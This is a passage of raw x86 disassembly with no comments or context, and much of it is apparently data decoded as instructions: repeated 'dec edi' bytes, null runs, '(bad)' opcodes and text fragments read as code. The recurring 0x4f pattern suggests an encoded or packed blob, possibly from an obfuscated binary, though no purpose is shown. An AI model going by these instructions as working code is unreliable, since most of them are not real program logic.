  4149aa:	cmp    cl,BYTE PTR [edi+0x77]
  4149ad:	dec    edi
  4149ae:	cmp    eax,0x304f4f4f
  4149b3:	dec    edi
  4149b4:	jb     0x414a05
  4149b6:	xor    ecx,DWORD PTR [edi+0x5e]
  4149b9:	dec    edi
  4149ba:	ss dec edi
  4149bc:	popa   
  4149bd:	dec    edi
  4149be:	sub    DWORD PTR [edi+0x3a],ecx
  4149c1:	dec    edi
  4149c2:	sub    cl,BYTE PTR [edi+0x1e]
  4149c5:	bound  ebx,QWORD PTR [edi]
  4149c7:	arpl   WORD PTR [ecx],si
  4149c9:	dec    edi
  4149ca:	jno    0x414a1b
  4149cc:	cmp    cl,BYTE PTR [edi+0x6a]
  4149cf:	dec    edi
  4149d0:	cmp    eax,0x314f7b4f
  4149d5:	dec    edi
  4149d6:	dec    esp
  4149d7:	dec    edi
  4149d8:	xor    al,0x4f
  4149da:	cmp    cl,BYTE PTR [edi+0x28]
  4149dd:	dec    edi
  4149de:	push   ds
  4149df:	jb     0x414a00
  4149e1:	jae    0x4149f2
  4149e3:	add    DWORD PTR [eax],0xffffff80
  4149e6:	jo     0x414978
  4149e8:	jno    0x41497b
  4149ea:	aas    
  4149eb:	dec    edi
  4149ec:	jbe    0x414a3d
  4149ee:	cmp    cl,BYTE PTR [edi+0x76]
  4149f1:	dec    edi
  4149f2:	ds dec edi
  4149f4:	dec    esp
  4149f5:	dec    edi
  4149f6:	xor    DWORD PTR [edi+0x7b],ecx
  4149f9:	dec    edi
  4149fa:	xor    eax,0x364f3a4f
  4149ff:	dec    edi
  414a00:	push   ds
  414a01:	sbb    BYTE PTR [edi],0x83
  414a04:	setae  BYTE PTR [eax]
  414a07:	nop
  414a08:	jo     0x4149aa
  414a0a:	jno    0x4149ad
  414a0c:	aas    
  414a0d:	dec    edi
  414a0e:	jbe    0x414a5f
  414a10:	cmp    cl,BYTE PTR [edi+0x76]
  414a13:	dec    edi
  414a14:	ds dec edi
  414a16:	dec    esp
  414a17:	dec    edi
  414a18:	xor    DWORD PTR [edi+0x61],ecx
  414a1b:	dec    edi
  414a1c:	xor    eax,0x364f3a4f
  414a21:	dec    edi
  414a22:	push   ds
  414a23:	xchg   edx,eax
  414a24:	pop    ds
  414a25:	xchg   ebx,eax
  414a26:	bt     DWORD PTR [eax],eax
  414a29:	mov    al,ds:0xb171b070
  414a2e:	aas    
  414a2f:	dec    edi
  414a30:	pusha  
  414a31:	dec    edi
  414a32:	cmp    cl,BYTE PTR [edi+0x4e]
  414a35:	dec    edi
  414a36:	cmp    eax,0x314f7b4f
  414a3b:	dec    edi
  414a3c:	dec    ecx
  414a3d:	dec    edi
  414a3e:	xor    al,0x4f
  414a40:	cmp    cl,BYTE PTR [edi+0x36]
  414a43:	dec    edi
  414a44:	push   ds
  414a45:	mov    ds:0xb30fa31f,al
  414a4a:	add    BYTE PTR [eax-0x3e8e3f90],dh
  414a50:	aas    
  414a51:	dec    edi
  414a52:	pusha  
  414a53:	dec    edi
  414a54:	cmp    cl,BYTE PTR [edi+0x4e]
  414a57:	dec    edi
  414a58:	cmp    eax,0x314f704f
  414a5d:	dec    edi
  414a5e:	pop    edi
  414a5f:	dec    edi
  414a60:	xor    ecx,DWORD PTR [edi+0x3a]
  414a63:	dec    edi
  414a64:	xor    eax,0x1fb21e4f
  414a69:	mov    bl,0xf
  414a6b:	ret    
  414a6c:	add    al,al
  414a6e:	jo     0x414a40
  414a70:	jno    0x414a43
  414a72:	aas    
  414a73:	dec    edi
  414a74:	pusha  
  414a75:	dec    edi
  414a76:	cmp    cl,BYTE PTR [edi+0x4e]
  414a79:	dec    edi
  414a7a:	cmp    eax,0x314f6a4f
  414a7f:	dec    edi
  414a80:	dec    esi
  414a81:	dec    edi
  414a82:	xor    al,0x4f
  414a84:	cmp    cl,BYTE PTR [edi+0x28]
  414a87:	dec    edi
  414a88:	push   ds
  414a89:	ret    0xc31f
  414a8c:	psrlq  mm0,QWORD PTR [eax]
  414a8f:	shl    BYTE PTR [eax-0x20],1
  414a92:	jno    0x414a75
  414a94:	aas    
  414a95:	dec    edi
  414a96:	pusha  
  414a97:	dec    edi
  414a98:	cmp    cl,BYTE PTR [edi+0x4e]
  414a9b:	dec    edi
  414a9c:	cmp    eax,0x314f6b4f
  414aa1:	dec    edi
  414aa2:	dec    esp
  414aa3:	dec    edi
  414aa4:	xor    al,0x4f
  414aa6:	cmp    cl,BYTE PTR [edi+0x36]
  414aa9:	dec    edi
  414aaa:	push   ds
  414aab:	rcr    BYTE PTR [edi],cl
  414aad:	ror    DWORD PTR [edi],cl
  414aaf:	jecxz  0x414ab1
  414ab1:	loopne 0x414b23
  414ab3:	lock jno 0x414aa7
  414ab6:	aas    
  414ab7:	dec    edi
  414ab8:	ins    DWORD PTR es:[edi],dx
  414ab9:	dec    edi
  414aba:	cmp    cl,BYTE PTR [edi+0x5f]
  414abd:	dec    edi
  414abe:	cmp    eax,0x3e4f4a4f
  414ac3:	dec    edi
  414ac4:	cmp    cl,BYTE PTR [edi+0x3f]
  414ac7:	dec    edi
  414ac8:	push   ds
  414ac9:	loop   0x414aea
  414acb:	jecxz  0x414adc
  414acd:	repz add al,dh
  414ad0:	jo     0x414ad2
  414ad2:	jno    0x414ad5
  414ad4:	jo     0x414ae6
  414ad6:	jno    0x414ae9
  414ad8:	ds dec edi
  414ada:	jg     0x414b2b
  414adc:	cmp    cl,BYTE PTR [edi+0x53]
  414adf:	dec    edi
  414ae0:	cmp    al,0x4f
  414ae2:	push   0x4f
  414ae4:	ds dec edi
  414ae6:	dec    ebp
  414ae7:	dec    edi
  414ae8:	xor    ecx,DWORD PTR [edi+0x3a]
  414aeb:	dec    edi
  414aec:	xor    eax,0x1f021e4f
  414af1:	add    ecx,DWORD PTR [edi]
  414af3:	adc    eax,DWORD PTR [eax]
  414af5:	adc    BYTE PTR [eax+0x20],dh
  414af8:	jno    0x414b1b
  414afa:	aas    
  414afb:	dec    edi
  414afc:	add    BYTE PTR [eax],al
  414afe:	xchg   BYTE PTR [ecx+0x41],cl
  414b01:	add    BYTE PTR [edx+0x4b],bh
  414b04:	inc    ecx
  414b05:	add    BYTE PTR [edx-0x41ffbeb5],al
  414b0b:	dec    ebp
  414b0c:	inc    ecx
  414b0d:	add    BYTE PTR [esi],ah
  414b0f:	dec    ebp
  414b10:	inc    ecx
  414b11:	add    BYTE PTR [esi+0x6200414d],ch
  414b17:	dec    ebx
  414b18:	inc    ecx
  414b19:	add    BYTE PTR [esi+0x4b],ah
  414b1c:	inc    ecx
  414b1d:	add    BYTE PTR [esi-0x35ffbeb3],ah
  414b23:	dec    ebx
  414b24:	inc    ecx
  414b25:	add    BYTE PTR [ecx-0x49076357],dh
  414b2b:	mov    edx,0x4b7ef89c
  414b30:	inc    ecx
  414b31:	add    dh,bl
  414b33:	dec    esp
  414b34:	inc    ecx
  414b35:	add    dl,dh
  414b37:	dec    esp
  414b38:	inc    ecx
  414b39:	add    dh,bh
  414b3b:	dec    esp
  414b3c:	inc    ecx
  414b3d:	add    BYTE PTR [esi],cl
  414b3f:	dec    ebp
  414b40:	inc    ecx
  414b41:	add    BYTE PTR [esi-0x7dffbeb5],dh
  414b47:	dec    ecx
  414b48:	inc    ecx
  414b49:	add    dh,dl
  414b4b:	dec    ebx
  414b4c:	inc    ecx
  414b4d:	add    dh,al
  414b4f:	dec    ebx
  414b50:	inc    ecx
  414b51:	add    dl,al
  414b53:	dec    ebp
  414b54:	inc    ecx
  414b55:	add    BYTE PTR [esi],dh
  414b57:	test   DWORD PTR [eax+edi*8-0x7ee8f463],ebx
  414b5e:	mov    cl,BYTE PTR [ebx+0x41]
  414b61:	add    BYTE PTR [eax-0x737ee9e4],bl
  414b67:	or     eax,0x705
  414b6c:	inc    eax
  414b6d:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  414b71:	fstp   QWORD PTR [ebx+0x44]
  414b74:	inc    ebx
  414b75:	add    BYTE PTR [edx+0x68],dh
  414b78:	inc    ebp
  414b79:	inc    ecx
  414b7a:	mov    edx,?
  414b7c:	jne    0x414be0
  414b7e:	mov    ebp,gs
  414b80:	inc    BYTE PTR [edi]
  414b82:	mov    edi,0x7205a3fa
  414b87:	dec    ebx
  414b88:	inc    ecx
  414b89:	add    BYTE PTR [ecx],bh
  414b8b:	xchg   ebp,eax
  414b8c:	pushf  
  414b8d:	clc    
  414b8e:	cmp    DWORD PTR [esi-0x6ac70764],edx
  414b94:	pushf  
  414b95:	clc    
  414b96:	cmp    edx,DWORD PTR [ebp-0x6ac50764]
  414b9c:	pushf  
  414b9d:	clc    
  414b9e:	cmp    eax,0x3cf89c95
  414ba3:	xchg   ebp,eax
  414ba4:	pushf  
  414ba5:	clc    
  414ba6:	aas    
  414ba7:	xchg   ebp,eax
  414ba8:	pushf  
  414ba9:	clc    
  414baa:	ds xchg ebp,eax
  414bac:	pushf  
  414bad:	clc    
  414bae:	and    DWORD PTR [ebp-0x6ad90764],edx
  414bb4:	pushf  
  414bb5:	clc    
  414bb6:	jmp    0x4149:0x7a6003f9
  414bbd:	add    BYTE PTR [edi+ecx*1],dh
  414bc0:	inc    ebx
  414bc1:	add    BYTE PTR [ecx+0x49],bl
  414bc4:	imul   si,WORD PTR [esi],0xff85
  414bc8:	pushf  
  414bc9:	clc    
  414bca:	popf   
  414bcb:	jmp    0xac75320
  414bd0:	add    BYTE PTR [eax],al
  414bd2:	jbe    0x414c1d
  414bd4:	inc    ecx
  414bd5:	add    BYTE PTR [ebx+0xe040b],bl
	...
  414c0b:	adc    BYTE PTR [eax+0x0],al
  414c0e:	pop    eax
  414c0f:	pop    ds
  414c10:	inc    ebx
  414c11:	add    BYTE PTR [eax],al
  414c13:	add    BYTE PTR [eax],al
  414c15:	add    BYTE PTR [ecx+0x0],cl
  414c18:	inc    esp
  414c19:	add    BYTE PTR [ecx+0x0],ch
  414c1c:	add    BYTE PTR fs:[ebx+0x0],cl
  414c20:	dec    edx
  414c21:	add    BYTE PTR [ebx+0x0],cl
  414c24:	dec    edx
  414c25:	add    BYTE PTR [eax+eax*1+0x6b],al
  414c29:	add    BYTE PTR [eax+eax*1+0x6a],ch
  414c2d:	add    BYTE PTR [eax+eax*1+0x4c],al
  414c31:	add    BYTE PTR [ecx+0x0],cl
  414c34:	inc    esp
  414c35:	add    BYTE PTR [eax+eax*1+0x49],cl
  414c39:	add    BYTE PTR [ebp+0x0],dl
  414c3c:	dec    edx
  414c3d:	add    BYTE PTR [ebx+0x0],cl
  414c40:	inc    esp
  414c41:	add    BYTE PTR [eax+eax*1+0x4a],cl
  414c45:	add    BYTE PTR [ebx+0x0],cl
  414c48:	dec    eax
  414c49:	add    BYTE PTR [eax+eax*1+0x4a],al
	...
  414c55:	add    BYTE PTR [ebx+ebp*2+0x6a],ah
  414c59:	jae    0x414cc6
  414c5b:	ins    BYTE PTR es:[edi],dx
  414c5c:	popa   
  414c5d:	imul   ebp,DWORD PTR [edx+ebp*2+0x4c],0x4b
  414c62:	dec    ecx
  414c63:	dec    edx
  414c64:	inc    esp
  414c65:	inc    esi
  414c66:	ins    BYTE PTR es:[edi],dx
  414c67:	imul   ebp,DWORD PTR [ebx+0x75],0x736c6466
  414c6e:	imul   ebp,DWORD PTR [ecx+0x68],0x67
  414c72:	ins    BYTE PTR es:[edi],dx
  414c73:	jae    0x414ce0
  414c75:	push   0x66
  414c77:	ins    BYTE PTR es:[edi],dx
  414c78:	imul   ecx,DWORD PTR [edx+0x4b],0x44
  414c7c:	imul   sp,WORD PTR [esi+eiz*2+0x68],0x73
  414c82:	imul   esp,DWORD PTR [edi+0x66],0x68
  414c86:	jae    0x414cec
  414c88:	imul   esi,DWORD PTR [ebp+0x6b],0x64756679
  414c8f:	imul   esi,DWORD PTR [ebx+0x6b],0x486a6b68
  414c96:	dec    ebx
  414c97:	dec    edx
  414c98:	inc    esp
  414c99:	inc    esi
  414c9a:	push   0x756b7364
  414c9f:	outs   dx,DWORD PTR ds:[si]
  414ca1:	imul   esi,DWORD PTR [ebx+0x66],0x6b677564
  414ca8:	push   0x66
  414caa:	fs jae 0x414d15
  414cad:	imul   ebp,DWORD PTR [si+0x66],0x68
  414cb2:	ins    BYTE PTR es:[edi],dx
  414cb3:	imul   esp,DWORD PTR [edi+0x6a],0x75
  414cb7:	push   0x6a6b6466
  414cbc:	jne    0x414d25
  414cbe:	jns    0x414d24
  414cc0:	imul   si,WORD PTR [di+0x66],0x6764
  414cc7:	jne    0x414d35
  414cc9:	fs pushw 0x6c67
  414cce:	push   0x68
  414cd0:	data16 add BYTE PTR fs:[eax],al
  414cd4:	add    BYTE PTR [eax],al
  414cd6:	add    BYTE PTR [eax],al
  414cd8:	add    BYTE PTR [eax],al
  414cda:	xor    edx,DWORD PTR [ebx]
  414cdc:	inc    ecx
  414cdd:	add    BYTE PTR [ebp+0x4f],dl
  414ce0:	pop    edi
  414ce1:	dec    edi
  414ce2:	dec    esp
  414ce3:	dec    edi
  414ce4:	dec    eax
  414ce5:	dec    edi
  414ce6:	pop    edi
  414ce7:	dec    edi
  414ce8:	push   esi
  414ce9:	dec    edi
  414cea:	or     eax,0x3a4f0c4f
  414cef:	dec    edi
  414cf0:	add    BYTE PTR [eax],al
  414cf2:	push   ecx
  414cf3:	dec    edi
  414cf4:	pop    esi
  414cf5:	dec    edi
  414cf6:	push   ebx
  414cf7:	dec    edi
  414cf8:	or     eax,0x3a4f0c4f
  414cfd:	dec    edi
  414cfe:	dec    edi
  414cff:	dec    edi
  414d00:	dec    ebp
  414d01:	dec    edi
  414d02:	pop    edi
  414d03:	dec    edi
  414d04:	dec    esp
  414d05:	dec    edi
  414d06:	or     eax,0x3a4f0c4f
  414d0b:	dec    edi
  414d0c:	add    BYTE PTR [eax],al
  414d0e:	dec    ebp
  414d0f:	dec    edi
  414d10:	push   edx
  414d11:	dec    edi
  414d12:	push   esi
  414d13:	dec    edi
  414d14:	inc    ecx
  414d15:	dec    edi
  414d16:	pop    ebx
  414d17:	dec    edi
  414d18:	dec    edx
  414d19:	dec    edi
  414d1a:	push   ebx
  414d1b:	dec    edi
  414d1c:	cmp    cl,BYTE PTR [edi+0x0]
  414d1f:	add    BYTE PTR [eax],al
  414d21:	add    BYTE PTR [eax],al
  414d23:	add    BYTE PTR [eax],al
  414d25:	add    BYTE PTR [esi+0x7d],ch
  414d28:	outs   dx,BYTE PTR ds:[esi]
  414d29:	lea    ebp,[esi-0x63]
  414d2c:	outs   dx,BYTE PTR ds:[esi]
  414d2d:	lods   eax,DWORD PTR ds:[esi]
  414d2e:	outs   dx,BYTE PTR ds:[esi]
  414d2f:	mov    ebp,0xdd6ecd6e
  414d34:	outs   dx,BYTE PTR ds:[esi]
  414d35:	in     eax,dx
  414d36:	outs   dx,BYTE PTR ds:[esi]
  414d37:	std    
  414d38:	outs   dx,BYTE PTR ds:[esi]
  414d39:	or     eax,0x2d6e1d6e
  414d3e:	outs   dx,BYTE PTR ds:[esi]
  414d3f:	cmp    eax,0x6d6e5d6e
  414d44:	outs   dx,BYTE PTR ds:[esi]
  414d45:	jb     0x414db5
  414d47:	jae    0x414db7
  414d49:	jo     0x414db9
  414d4b:	jno    0x414dbb
  414d4d:	jbe    0x414dbd
  414d4f:	ja     0x414dbf
  414d51:	je     0x414dc1
  414d53:	jne    0x414dc3
  414d55:	mov    ch,BYTE PTR [esi-0x75]
  414d58:	outs   dx,BYTE PTR ds:[esi]
  414d59:	mov    BYTE PTR [esi-0x77],ch
  414d5c:	outs   dx,BYTE PTR ds:[esi]
  414d5d:	mov    gs,WORD PTR [esi+0x7c]
  414d60:	pop    esi
  414d61:	jge    0x414db1
  414d63:	jge    0x414d23
  414d65:	jge    0x414db7
  414d67:	(bad)  
  414d68:	jno    0x414dda
  414d6a:	mov    cl,0xb1
  414d6c:	outs   dx,BYTE PTR ds:[esi]
  414d6d:	jae    0x414dec
  414d6f:	bound  esp,QWORD PTR [edx+0x7c265fc6]
  414d75:	add    BYTE PTR [ecx+0x17],al
  414d78:	mov    bl,0x56
  414d7a:	mov    cl,0xf4
  414d7c:	inc    edx
  414d7d:	aaa    
  414d7e:	inc    edx
  414d7f:	jle    0x414d12
  414d81:	jno    0x414ddb
  414d83:	mov    cl,0x4
  414d85:	imul   esp,DWORD PTR [eax-0x70282bf8],0x5
  414d8c:	inc    esp
  414d8d:	xlat   BYTE PTR ds:[ebx]
  414d8e:	leave  
  414d8f:	xchg   ebx,eax
  414d90:	inc    eax
  414d91:	adc    eax,ecx
  414d93:	jge    0x414d60
  414d95:	faddp  st(7),st
  414d97:	leave  
  414d98:	xchg   BYTE PTR [esi+0x1fa23208],ah
  414d9e:	fs icebp 
  414da0:	dec    eax
  414da1:	(bad)  
  414da2:	leave  
  414da3:	sbb    cl,cl
  414da5:	jno    0x414d93
  414da7:	(bad)  [ebx+0x7]
  414daa:	ror    BYTE PTR [ebx+0x41],cl
  414dad:	add    BYTE PTR [ebp+0x2f],al
  414db0:	shl    BYTE PTR [edx],0x2c
  414db3:	xor    eax,DWORD PTR [ecx+0x0]
  414db6:	inc    esi
  414db7:	push   ebx
  414db8:	outs   dx,DWORD PTR ds:[esi]
  414db9:	push   ebx
  414dba:	push   0x4b
  414dbc:	inc    ecx
  414dbd:	add    dh,cl
  414dbf:	dec    ebx
  414dc0:	inc    ecx
  414dc1:	add    BYTE PTR [ebp+ebp*8+0x712],cl
	...
  414de4:	add    BYTE PTR [eax],al
  414de6:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  414ded:	pop    ecx
  414dee:	outs   dx,BYTE PTR ds:[esi]
  414def:	jbe    0x414e69
  414df1:	jns    0x414e47
  414df3:	push   ecx
  414df4:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  414df8:	je     0x414e5b
	...
  414e0e:	jp     0x414e64
  414e10:	arpl   WORD PTR [ecx+0x4b],cx
  414e13:	push   edx
  414e14:	imul   ebp,DWORD PTR [eax+0x53],0x4746536f
  414e1b:	push   0x66495949
  414e20:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  414e24:	push   esi
  414e25:	jb     0x414e8f
  414e27:	add    BYTE PTR [ebx+0x51],al
  414e2a:	ins    BYTE PTR es:[edi],dx
  414e2b:	pop    eax
  414e2c:	ja     0x414e7b
  414e2e:	je     0x414ea6
  414e30:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  414e34:	in     al,0xf5
  414e36:	jnp    0x414e86
  414e38:	jnp    0x414e08
  414e3a:	cmc    
  414e3b:	push   DWORD PTR [ebx]
  414e3d:	sar    ebx,cl
  414e3f:	fld    DWORD PTR [esi+0x7]
  414e42:	cvtps2pd xmm1,QWORD PTR [ebp+eiz*8+0xf60000]
  414e4a:	add    BYTE PTR [eax],al
  414e4c:	lds    ebp,FWORD PTR [edx]
  414e4e:	jle    0x414e2f
  414e50:	add    eax,0x65113264
  414e55:	loop   0x414e4f
  414e57:	stos   BYTE PTR es:[edi],al
  414e58:	add    DWORD PTR [eax],0x31
  414e5b:	mov    eax,0x6231ebdb
  414e60:	xor    ebx,esp
  414e62:	hlt    
  414e63:	sub    ch,cl
  414e65:	add    eax,0x4fd61771
  414e6a:	sbb    DWORD PTR [edx+0x525c3cd9],0xffffff88
  414e71:	(bad)  
  414e72:	adc    edi,eax
  414e74:	out    dx,al
  414e75:	(bad)  
  414e77:	dec    ecx
  414e78:	shr    DWORD PTR [ebx+0x3f],0xd6
  414e7c:	test   DWORD PTR [esi-0xbd95134],edx
  414e82:	inc    edi
  414e83:	dec    esp
  414e84:	and    cl,al
  414e86:	inc    ebx
  414e87:	jecxz  0x414ecc
  414e89:	aaa    
  414e8a:	pop    ds
  414e8b:	xor    BYTE PTR [eax],bl
  414e8d:	sub    al,0x0
  414e8f:	inc    ecx
  414e90:	push   0x1cdd0142
  414e95:	jl     0x414ee0
  414e97:	loopne 0x414ef1
  414e99:	(bad)  
  414e9a:	or     al,0xab
  414e9c:	ja     0x414eef
  414e9e:	rcr    DWORD PTR [edx-0x50],0x18
  414ea2:	jg     0x414ee3
  414ea4:	retf   0xfde6
  414ea7:	sahf   
  414ea8:	shr    ch,1
  414eaa:	dec    esp
  414eab:	call   0xe0c8dfd4
  414eb0:	sub    BYTE PTR [ebp+0x23],0xba
  414eb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414eb5:	mov    cl,0xff
  414eb7:	retf   0x3537
  414eba:	mov    bh,0x1d
  414ebc:	ds jb  0x414e84
  414ebf:	push   ebx
  414ec0:	into   
  414ec1:	mov    edx,cs
  414ec3:	push   ss
  414ec4:	cmp    eax,0x739b5e70
  414ec9:	aas    
  414eca:	lock sub DWORD PTR [ebp+0x4a435e6b],ebx
  414ed1:	xor    BYTE PTR [ebx-0xe],0xca
  414ed5:	jmp    0x22d8c841
  414eda:	dec    ebx
  414edb:	dec    ecx
  414edc:	and    DWORD PTR [ebx],ecx
  414ede:	int3   
  414edf:	mov    cl,BYTE PTR [ecx]
  414ee1:	repnz fs fistp WORD PTR gs:[edx-0x5d]
  414ee7:	repnz scas eax,DWORD PTR es:[edi]
  414ee9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414eea:	ror    BYTE PTR [ebx-0x25],0x77
  414eee:	xor    edi,DWORD PTR [edx-0xc]
  414ef1:	shr    DWORD PTR ds:0xa98ddeb1,cl
  414ef7:	fld    TBYTE PTR [ecx+0x6e]
  414efa:	sbb    BYTE PTR [eax],bl
  414efc:	ret    
  414efd:	(bad)  
  414efe:	inc    edi
  414eff:	inc    ebx
  414f00:	inc    edx
  414f01:	push   es
  414f02:	add    eax,0xd65fb904
  414f07:	fwait
  414f08:	push   eax
  414f09:	or     al,0x69
  414f0b:	lods   eax,DWORD PTR ds:[esi]
  414f0c:	mov    ds:0xb62b2a46,al
  414f11:	xor    al,0x2
  414f13:	and    al,0xc6
  414f15:	sbb    eax,esp
  414f17:	mov    es,edx
  414f19:	push   0xd65bd52e
  414f1e:	push   edx
  414f1f:	test   BYTE PTR [eax+eax*1-0x70],dl
  414f23:	ror    BYTE PTR [edi-0x515b9e76],0x44
  414f2a:	(bad)  
  414f2b:	xchg   ebx,eax
  414f2c:	mov    esi,DWORD PTR [edi+0x65]
  414f2f:	and    DWORD PTR [ebx+0xf],esp
  414f32:	fisubr DWORD PTR [ebp+0x76bbfc86]
  414f38:	push   ds
  414f39:	cmc    
  414f3a:	push   ebp
  414f3b:	or     edx,DWORD PTR [edx+0x6d]
  414f3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f3f:	mov    ds:0xde36,eax
	...
  414fb4:	pop    edx
  414fb5:	ficom  DWORD PTR [esi+0x60]
  414fb8:	(bad)  
  414fb9:	in     al,dx
  414fba:	jle    0x414fb6
  414fbc:	cs pop ebx
  414fbe:	pop    ss
  414fbf:	ret    0x664f
  414fc2:	xchg   edi,eax
  414fc3:	imul   eax,DWORD PTR [edx-0x9ffff1a],0x2e000000
  414fcd:	push   esp
  414fce:	add    BYTE PTR [edi+0x7cda6ae2],0x92
  414fd5:	mov    ds:0x81b2de9,eax
  414fda:	or     ebp,DWORD PTR [ebx-0x6f]
  414fdd:	aad    0xfa
  414fdf:	jns    0x414fba
  414fe1:	clc    
  414fe2:	cwde   
  414fe3:	jbe    0x414f7c
  414fe5:	jmp    FWORD PTR [edi+0x61404191]
  414feb:	mov    bl,0x20
  414fed:	repnz xor ah,BYTE PTR [edi+0x5b4407f7]
  414ff4:	or     al,ch
  414ff6:	lahf   
  414ff7:	inc    ecx
  414ff8:	mov    dl,0x9c
  414ffa:	mov    ah,0x53
  414ffc:	cmp    dl,bh
  414ffe:	loope  0x414f8f
  415000:	mov    eax,ds:0xb4e11cff
  415005:	outs   dx,BYTE PTR ds:[esi]
  415006:	out    0xe4,al
  415008:	cmp    DWORD PTR [edi+0x55],0x280738ed
  41500f:	retf   
  415010:	mov    dh,0xd8
  415012:	cmp    esp,0x25
  415015:	push   ds
  415016:	ds cs aaa 
  415019:	sub    cl,dl
  41501b:	fldenv [edi]
  41501d:	aad    0x25
  41501f:	xor    ah,BYTE PTR [edx-0x73]
  415022:	cwde   
  415023:	rol    bh,0x4
  415026:	popa   
  415027:	and    eax,0xd17b0d09
  41502c:	test   BYTE PTR [edx+0x5094dc29],ah
  415032:	add    eax,0x2f6bdab8
  415037:	mov    eax,?
  415039:	aaa    
  41503a:	(bad)  [eax+0x3f]
  41503d:	pop    es
  41503e:	cmp    BYTE PTR [ecx],ah
  415040:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415041:	call   0x2bc9591f
  415046:	push   ebx
  415047:	push   esi
  415048:	xlat   BYTE PTR ds:[ebx]
  415049:	sub    eax,0xe118135f
  41504e:	xchg   ecx,eax
  41504f:	xchg   edi,eax
  415050:	adc    ecx,DWORD PTR [edx-0x1e]
  415053:	adc    ebp,DWORD PTR [ecx+edi*4]
  415056:	xor    eax,0xe623a739
  41505b:	pop    ss
  41505c:	jp     0x415016
  41505e:	in     eax,dx
  41505f:	sbb    bh,ah
  415061:	xor    eax,0xceecb641
  415066:	xchg   al,ch
  415068:	mov    al,ds:0xfb0e20f9
  41506d:	popa   
  41506e:	xchg   DWORD PTR [esi+ebx*8],esp
  415071:	jge    0x415004
  415073:	inc    edx
  415074:	or     bl,BYTE PTR [edx]
  415076:	jne    0x4150c3
  415078:	leave  
  415079:	push   esi
  41507a:	mov    WORD PTR [ebx+0x1d],?
  41507d:	push   esp
  41507e:	xor    BYTE PTR [edi+0x7c],0x7a
  415082:	push   0x66d1ad55
  415087:	dec    edi
  415088:	cdq    
  415089:	xchg   BYTE PTR [ebp+0x31],ch
  41508c:	lea    ecx,[ebp-0x758300a0]
  415092:	repnz out 0x9a,al
  415095:	push   esp
  415096:	mov    WORD PTR [edx-0x25],fs
  415099:	inc    ebx
  41509a:	push   eax
  41509b:	mov    bl,0x4b
  41509d:	mov    ds:0x86c9535a,eax
  4150a2:	mov    al,ds:0xd38b28d1
  4150a7:	cs sahf 
  4150a9:	mov    ebx,0xd382ab08
  4150ae:	aam    0x51
  4150b0:	sbb    sp,dx
  4150b3:	in     al,0x7c
  4150b5:	frstor [ebx+0x52]
  4150b8:	sub    dh,BYTE PTR [edx]
  4150ba:	(bad)  
  4150bb:	and    al,ch
  4150bd:	pop    ebx
  4150be:	dec    ebx
  4150bf:	xor    esp,ecx
  4150c1:	stc    
	...
  415132:	add    BYTE PTR [eax],al
  415134:	add    dl,BYTE PTR [edx]
  415136:	add    DWORD PTR [ebx-0x4c5d4cef],esp
  41513c:	adc    ah,BYTE PTR [esi-0x227e3b27]
  415142:	std    
  415143:	das    
  415144:	js     0x41512d
  415146:	add    BYTE PTR [eax],al
  415148:	test   BYTE PTR [eax],0x0
  41514b:	add    BYTE PTR [edi+0x5a],bl
  41514e:	mov    ebx,0xff7ad0bd
  415153:	or     cl,al
  415155:	mov    eax,ds:0xc2d3be01
  41515a:	dec    ebp
  41515b:	sub    dh,ah
  41515d:	sub    al,0xc4
  41515f:	jo     0x4151a7
  415161:	daa    
  415162:	push   ds
  415163:	sub    esi,ebp
  415165:	out    0x99,al
  415167:	in     eax,0x1c
  415169:	and    BYTE PTR ds:0x7d9eb3e9,dl
  41516f:	arpl   WORD PTR [ebx-0x7f],bp
  415172:	mov    DWORD PTR [ebx-0x20fe20e4],ecx
  415178:	pop    edx
  415179:	dec    edx
  41517a:	mov    ah,0x1a
  41517c:	sbb    al,0xe9
  41517e:	ficom  WORD PTR [ecx]
  415180:	add    BYTE PTR [ecx],al
  415182:	or     al,cl
  415184:	out    0x3d,al
  415186:	push   ebp
  415187:	jmp    0x4151ec
  415189:	or     DWORD PTR [eax+0x580471c5],ebp
  41518f:	pop    eax
  415190:	std    
  415191:	and    BYTE PTR [ecx],ch
  415193:	mov    ds:0x4952d0bd,eax
  415198:	pop    edx
  415199:	and    ecx,DWORD PTR [edi-0x4950edd2]
  41519f:	xchg   ecx,eax
  4151a0:	or     ah,dh
  4151a2:	lods   eax,DWORD PTR ds:[esi]
  4151a3:	std    
  4151a4:	push   eax
  4151a5:	xchg   BYTE PTR [ecx+esi*1-0x5bcafdc],ah
  4151ac:	sbb    DWORD PTR [edx-0x1c6f234d],0x34
  4151b3:	cmp    BYTE PTR [ecx],al
  4151b5:	scas   eax,DWORD PTR es:[edi]
  4151b6:	stos   DWORD PTR es:[edi],eax
  4151b7:	mov    ch,0x31
  4151b9:	jb     0x415211
  4151bb:	outs   dx,DWORD PTR ds:[esi]
  4151bc:	or     DWORD PTR [eax+0x53],edx
  4151bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151c0:	jg     0x41521d
  4151c2:	(bad)  
  4151c3:	js     0x41518b
  4151c5:	shl    ch,0x2b
  4151c8:	mov    cl,0x97
  4151ca:	int3   
  4151cb:	dec    ecx
  4151cc:	mov    cl,0xd5
  4151ce:	stos   DWORD PTR es:[edi],eax
  4151cf:	xor    edx,DWORD PTR [eax+eiz*2]
  4151d2:	cmc    
  4151d3:	mov    edx,0xf8f15e99
  4151d8:	lahf   
  4151d9:	or     eax,0x4312049f
  4151de:	aaa    
  4151df:	pop    esp
  4151e0:	(bad)  
  4151e1:	popa   
  4151e2:	addr16 (bad) 
  4151e4:	cli    
  4151e5:	cmp    BYTE PTR [esi-0x25],ch
  4151e8:	loop   0x415238
  4151ea:	or     dh,BYTE PTR [ecx]
  4151ec:	cmp    DWORD PTR fs:[esi-0x4a808206],ebp
  4151f3:	retf   0x767
  4151f6:	inc    esp
  4151f7:	mov    edi,0x97fa9492
  4151fc:	mov    cl,0xa1
  4151fe:	stos   DWORD PTR es:[edi],eax
  4151ff:	cmp    ebx,DWORD PTR [edx]
